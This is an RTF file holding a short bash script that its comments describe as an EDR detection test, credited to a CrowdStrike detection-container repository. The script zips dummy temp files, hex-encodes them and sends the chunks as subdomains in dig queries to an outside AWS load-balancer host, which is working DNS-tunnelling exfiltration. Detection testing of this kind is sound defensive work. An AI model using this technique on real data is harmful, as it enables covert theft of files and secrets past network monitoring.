{\rtf1\ansi\ansicpg1252\cocoartf2761
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\fmodern\fcharset0 Courier;}
{\colortbl;\red255\green255\blue255;\red0\green0\blue0;}
{\*\expandedcolortbl;;\cssrgb\c0\c0\c0;}
\margl1440\margr1440\vieww27340\viewh11820\viewkind0
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\fs24 \cf0 # Script that will attempt to exfiltrate data using alternate channels (i.e DNS).\
# It should trigger an anomaly in your EDR tool.\
#\
# Source - https://raw.githubusercontent.com/CrowdStrike/detection-container/main/bin/Exfiltration_via_Exfiltration_Over_Alternative_Protocol.sh\
#\
\
\pard\pardeftab720\partightenfactor0

\f1\fs26 \cf0 \expnd0\expndtw0\kerning0
\outl0\strokewidth0 \strokec2 #!/bin/bash\
\
echo -e "\\e[92mExecuting Exfiltration Over Alternative Protocol using a DNS tool sendng requests to large domain names. This will take a moment to execute..." \
\
cd /tmp\
touch \{1..7\}.tmp\
zip -qm - *tmp|xxd -p >data\
for dat in `cat data `; do dig $dat.legit.term01-b-449152202.us-west-1.elb.amazonaws.com; done > /dev/null 2>&1\
rm data\
\
\
}